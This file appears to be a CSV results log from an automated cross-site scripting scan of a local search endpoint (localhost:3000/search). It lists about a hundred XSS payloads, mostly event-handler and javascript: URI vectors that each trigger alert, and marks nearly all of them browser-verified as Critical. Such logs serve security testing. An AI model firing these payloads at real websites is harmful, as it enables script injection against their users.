Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 16:23:30.492,2026-01-10 16:23:30.510,0.018,http://localhost:3000/search,GET,q,"<img src=""x"" onerror=""alert(1)"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:30.510,2026-01-10 16:23:30.512,0.003,http://localhost:3000/search,GET,q,<img src='x' onerror='alert(1)'>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:30.512,2026-01-10 16:23:30.529,0.017,http://localhost:3000/search,GET,q,<body onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:30.529,2026-01-10 16:23:30.546,0.017,http://localhost:3000/search,GET,q,<body onpageshow=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:30.546,2026-01-10 16:23:31.069,0.523,http://localhost:3000/search,GET,q,<body onfocus=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:23:31.069,2026-01-10 16:23:31.591,0.522,http://localhost:3000/search,GET,q,<body onhashchange=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:23:31.591,2026-01-10 16:23:31.606,0.015,http://localhost:3000/search,GET,q,<body onload=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.606,2026-01-10 16:23:31.623,0.017,http://localhost:3000/search,GET,q,<body onload=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.624,2026-01-10 16:23:31.644,0.020,http://localhost:3000/search,GET,q,<input onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.644,2026-01-10 16:23:31.649,0.005,http://localhost:3000/search,GET,q,<input onblur=alert(1) autofocus><input>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.649,2026-01-10 16:23:31.652,0.003,http://localhost:3000/search,GET,q,<input type=text value=x onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.652,2026-01-10 16:23:31.655,0.003,http://localhost:3000/search,GET,q,<input type=button value=xss onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.655,2026-01-10 16:23:31.658,0.003,http://localhost:3000/search,GET,q,<input type=image src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.658,2026-01-10 16:23:31.661,0.003,http://localhost:3000/search,GET,q,<iframe src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.661,2026-01-10 16:23:31.663,0.002,http://localhost:3000/search,GET,q,"<iframe src=""javascript:alert(1)"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.663,2026-01-10 16:23:31.669,0.006,http://localhost:3000/search,GET,q,<iframe onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.669,2026-01-10 16:23:31.672,0.003,http://localhost:3000/search,GET,q,<iframe/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.672,2026-01-10 16:23:31.674,0.003,http://localhost:3000/search,GET,q,"<iframe  rc=""data:text/html,<script>alert(1)</script>"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.674,2026-01-10 16:23:31.677,0.003,http://localhost:3000/search,GET,q,'-alert(1)-',RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.677,2026-01-10 16:23:31.680,0.003,http://localhost:3000/search,GET,q,<details open ontoggle=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.680,2026-01-10 16:23:31.686,0.005,http://localhost:3000/search,GET,q,<details ontoggle=alert(1)><summary>xss</summary></details>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.686,2026-01-10 16:23:31.689,0.003,http://localhost:3000/search,GET,q,<details open ontoggle=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.689,2026-01-10 16:23:31.691,0.002,http://localhost:3000/search,GET,q,<object data=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.691,2026-01-10 16:23:31.694,0.003,http://localhost:3000/search,GET,q,<embed src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.694,2026-01-10 16:23:31.696,0.003,http://localhost:3000/search,GET,q,"<object data=""data:text/html,<script>alert(1)</script>"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.697,2026-01-10 16:23:31.702,0.005,http://localhost:3000/search,GET,q,<select onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.702,2026-01-10 16:23:31.704,0.003,http://localhost:3000/search,GET,q,<textarea onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.705,2026-01-10 16:23:31.707,0.002,http://localhost:3000/search,GET,q,<keygen onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.707,2026-01-10 16:23:31.710,0.003,http://localhost:3000/search,GET,q,<marquee onstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.710,2026-01-10 16:23:31.713,0.003,http://localhost:3000/search,GET,q,<marquee loop=1 onfinish=alert(1)>x</marquee>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.713,2026-01-10 16:23:31.717,0.005,http://localhost:3000/search,GET,q,<video src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.717,2026-01-10 16:23:31.720,0.003,http://localhost:3000/search,GET,q,<audio src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.720,2026-01-10 16:23:31.724,0.003,http://localhost:3000/search,GET,q,<video><source onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.724,2026-01-10 16:23:31.726,0.003,http://localhost:3000/search,GET,q,<link rel=stylesheet href=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.726,2026-01-10 16:23:31.729,0.003,http://localhost:3000/search,GET,q,<a href=javascript:alert(1)>click</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.729,2026-01-10 16:23:31.733,0.004,http://localhost:3000/search,GET,q,"<a href=""javascript:alert(1)"">click</a>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.733,2026-01-10 16:23:31.736,0.002,http://localhost:3000/search,GET,q,<form action=javascript:alert(1)><input type=submit>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.736,2026-01-10 16:23:31.739,0.003,http://localhost:3000/search,GET,q,<form><button formaction=javascript:alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.739,2026-01-10 16:23:31.741,0.002,http://localhost:3000/search,GET,q,<form><input formaction=javascript:alert(1) type=submit value=X>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.741,2026-01-10 16:23:31.744,0.003,http://localhost:3000/search,GET,q,<meta http-equiv=refresh content=0;url=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.744,2026-01-10 16:23:31.746,0.003,http://localhost:3000/search,GET,q,"<meta http-equiv=refresh content=""0;javascript:alert(1)"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.746,2026-01-10 16:23:31.751,0.004,http://localhost:3000/search,GET,q,<style>*{background:url('javascript:alert(1)')}</style>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.751,2026-01-10 16:23:31.753,0.003,http://localhost:3000/search,GET,q,<style>@import'javascript:alert(1)';</style>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.753,2026-01-10 16:23:31.755,0.002,http://localhost:3000/search,GET,q,<style onload=alert(1)></style>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.755,2026-01-10 16:23:31.758,0.002,http://localhost:3000/search,GET,q,<math><mi xlink:href=javascript:alert(1)>X</mi></math>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.758,2026-01-10 16:23:31.760,0.002,http://localhost:3000/search,GET,q,<table background=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.760,2026-01-10 16:23:31.762,0.002,http://localhost:3000/search,GET,q,<table><td background=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.762,2026-01-10 16:23:31.767,0.004,http://localhost:3000/search,GET,q,<div onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.767,2026-01-10 16:23:31.769,0.002,http://localhost:3000/search,GET,q,<div style=width:expression(alert(1))>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.769,2026-01-10 16:23:31.771,0.002,http://localhost:3000/search,GET,q,<script>alert&#40;1&#41;</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.771,2026-01-10 16:23:31.774,0.002,http://localhost:3000/search,GET,q,<script>alert&#x28;1&#x29;</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.774,2026-01-10 16:23:31.776,0.002,http://localhost:3000/search,GET,q,<script>\u0061lert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.776,2026-01-10 16:23:31.778,0.002,http://localhost:3000/search,GET,q,<script>eval('\x61lert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.778,2026-01-10 16:23:31.783,0.005,http://localhost:3000/search,GET,q,<img src=x onabort=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.783,2026-01-10 16:23:31.786,0.003,http://localhost:3000/search,GET,q,<img src=x onactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.786,2026-01-10 16:23:31.789,0.003,http://localhost:3000/search,GET,q,<img src=x onafterprint=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.789,2026-01-10 16:23:31.791,0.002,http://localhost:3000/search,GET,q,<img src=x onafterupdate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.791,2026-01-10 16:23:31.793,0.003,http://localhost:3000/search,GET,q,<img src=x onbeforeactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.793,2026-01-10 16:23:31.796,0.002,http://localhost:3000/search,GET,q,<img src=x onbeforecopy=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.796,2026-01-10 16:23:31.800,0.005,http://localhost:3000/search,GET,q,<img src=x onbeforecut=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.800,2026-01-10 16:23:31.803,0.002,http://localhost:3000/search,GET,q,<img src=x onbeforedeactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.803,2026-01-10 16:23:31.805,0.002,http://localhost:3000/search,GET,q,<img src=x onbeforeeditfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.805,2026-01-10 16:23:31.807,0.002,http://localhost:3000/search,GET,q,<img src=x onbeforepaste=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.807,2026-01-10 16:23:31.809,0.002,http://localhost:3000/search,GET,q,<img src=x onbeforeprint=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.809,2026-01-10 16:23:31.811,0.002,http://localhost:3000/search,GET,q,<img src=x onbeforeunload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.811,2026-01-10 16:23:31.817,0.006,http://localhost:3000/search,GET,q,<img src=x onbeforeupdate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.817,2026-01-10 16:23:31.820,0.002,http://localhost:3000/search,GET,q,<img src=x onblur=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.820,2026-01-10 16:23:31.822,0.002,http://localhost:3000/search,GET,q,<img src=x onbounce=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.822,2026-01-10 16:23:31.824,0.002,http://localhost:3000/search,GET,q,<img src=x oncellchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.824,2026-01-10 16:23:31.827,0.003,http://localhost:3000/search,GET,q,<img src=x onchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.827,2026-01-10 16:23:31.829,0.002,http://localhost:3000/search,GET,q,<img src=x onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.829,2026-01-10 16:23:31.834,0.006,http://localhost:3000/search,GET,q,<img src=x oncontextmenu=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.835,2026-01-10 16:23:31.837,0.002,http://localhost:3000/search,GET,q,<img src=x oncontrolselect=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.837,2026-01-10 16:23:31.839,0.002,http://localhost:3000/search,GET,q,<img src=x oncopy=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.839,2026-01-10 16:23:31.841,0.002,http://localhost:3000/search,GET,q,<img src=x oncut=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.841,2026-01-10 16:23:31.844,0.003,http://localhost:3000/search,GET,q,<img src=x ondataavailable=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.844,2026-01-10 16:23:31.847,0.002,http://localhost:3000/search,GET,q,<img src=x ondatasetchanged=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.847,2026-01-10 16:23:31.854,0.007,http://localhost:3000/search,GET,q,<img src=x ondatasetcomplete=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.854,2026-01-10 16:23:31.857,0.004,http://localhost:3000/search,GET,q,<img src=x ondblclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.857,2026-01-10 16:23:31.860,0.003,http://localhost:3000/search,GET,q,<img src=x ondeactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.860,2026-01-10 16:23:31.863,0.003,http://localhost:3000/search,GET,q,<img src=x ondrag=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.863,2026-01-10 16:23:31.869,0.006,http://localhost:3000/search,GET,q,<img src=x ondragend=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.869,2026-01-10 16:23:31.871,0.003,http://localhost:3000/search,GET,q,<img src=x ondragenter=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.871,2026-01-10 16:23:31.874,0.002,http://localhost:3000/search,GET,q,<img src=x ondragleave=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.874,2026-01-10 16:23:31.876,0.003,http://localhost:3000/search,GET,q,<img src=x ondragover=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.876,2026-01-10 16:23:31.879,0.003,http://localhost:3000/search,GET,q,<img src=x ondragstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.879,2026-01-10 16:23:31.885,0.006,http://localhost:3000/search,GET,q,<img src=x ondrop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.885,2026-01-10 16:23:31.888,0.003,http://localhost:3000/search,GET,q,<img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.888,2026-01-10 16:23:31.891,0.003,http://localhost:3000/search,GET,q,<img src=x onerrorupdate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.891,2026-01-10 16:23:31.893,0.003,http://localhost:3000/search,GET,q,<img src=x onfilterchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.893,2026-01-10 16:23:31.896,0.003,http://localhost:3000/search,GET,q,<img src=x onfinish=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.896,2026-01-10 16:23:31.902,0.006,http://localhost:3000/search,GET,q,<img src=x onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.902,2026-01-10 16:23:31.905,0.003,http://localhost:3000/search,GET,q,<img src=x onfocusin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.905,2026-01-10 16:23:31.908,0.002,http://localhost:3000/search,GET,q,<img src=x onfocusout=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.908,2026-01-10 16:23:31.911,0.003,http://localhost:3000/search,GET,q,<img src=x onhelp=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.911,2026-01-10 16:23:31.914,0.003,http://localhost:3000/search,GET,q,<img src=x oninput=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.914,2026-01-10 16:23:31.924,0.010,http://localhost:3000/search,GET,q,<img src=x onkeydown=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.924,2026-01-10 16:23:31.927,0.003,http://localhost:3000/search,GET,q,<img src=x onkeypress=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.927,2026-01-10 16:23:31.930,0.002,http://localhost:3000/search,GET,q,<img src=x onkeyup=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.930,2026-01-10 16:23:31.936,0.006,http://localhost:3000/search,GET,q,<img src=x onlayoutcomplete=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.936,2026-01-10 16:23:31.939,0.004,http://localhost:3000/search,GET,q,<img src=x onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.939,2026-01-10 16:23:31.942,0.003,http://localhost:3000/search,GET,q,<img src=x onlosecapture=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.942,2026-01-10 16:23:31.946,0.004,http://localhost:3000/search,GET,q,<img src=x onmousedown=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.946,2026-01-10 16:23:31.953,0.007,http://localhost:3000/search,GET,q,<img src=x onmouseenter=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.953,2026-01-10 16:23:31.956,0.003,http://localhost:3000/search,GET,q,<img src=x onmouseleave=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.956,2026-01-10 16:23:31.959,0.003,http://localhost:3000/search,GET,q,<img src=x onmousemove=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.959,2026-01-10 16:23:31.962,0.004,http://localhost:3000/search,GET,q,<img src=x onmouseout=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.962,2026-01-10 16:23:31.965,0.003,http://localhost:3000/search,GET,q,<img src=x onmouseover=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.965,2026-01-10 16:23:31.972,0.007,http://localhost:3000/search,GET,q,<img src=x onmouseup=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.972,2026-01-10 16:23:31.975,0.003,http://localhost:3000/search,GET,q,<img src=x onmousewheel=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.975,2026-01-10 16:23:31.979,0.004,http://localhost:3000/search,GET,q,<img src=x onmove=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.979,2026-01-10 16:23:31.982,0.003,http://localhost:3000/search,GET,q,<img src=x onmoveend=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.982,2026-01-10 16:23:31.989,0.007,http://localhost:3000/search,GET,q,<img src=x onmovestart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.989,2026-01-10 16:23:31.992,0.003,http://localhost:3000/search,GET,q,<img src=x onpaste=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.992,2026-01-10 16:23:31.996,0.004,http://localhost:3000/search,GET,q,<img src=x onpropertychange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.996,2026-01-10 16:23:31.999,0.003,http://localhost:3000/search,GET,q,<img src=x onreadystatechange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:31.999,2026-01-10 16:23:32.006,0.007,http://localhost:3000/search,GET,q,<img src=x onreset=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.006,2026-01-10 16:23:32.009,0.003,http://localhost:3000/search,GET,q,<img src=x onresize=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.009,2026-01-10 16:23:32.013,0.004,http://localhost:3000/search,GET,q,<img src=x onresizeend=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.013,2026-01-10 16:23:32.016,0.003,http://localhost:3000/search,GET,q,<img src=x onresizestart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.016,2026-01-10 16:23:32.023,0.007,http://localhost:3000/search,GET,q,<img src=x onrowenter=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.023,2026-01-10 16:23:32.026,0.003,http://localhost:3000/search,GET,q,<img src=x onrowexit=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.026,2026-01-10 16:23:32.029,0.003,http://localhost:3000/search,GET,q,<img src=x onrowsdelete=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.029,2026-01-10 16:23:32.032,0.002,http://localhost:3000/search,GET,q,<img src=x onrowsinserted=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.032,2026-01-10 16:23:32.034,0.002,http://localhost:3000/search,GET,q,<img src=x onscroll=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
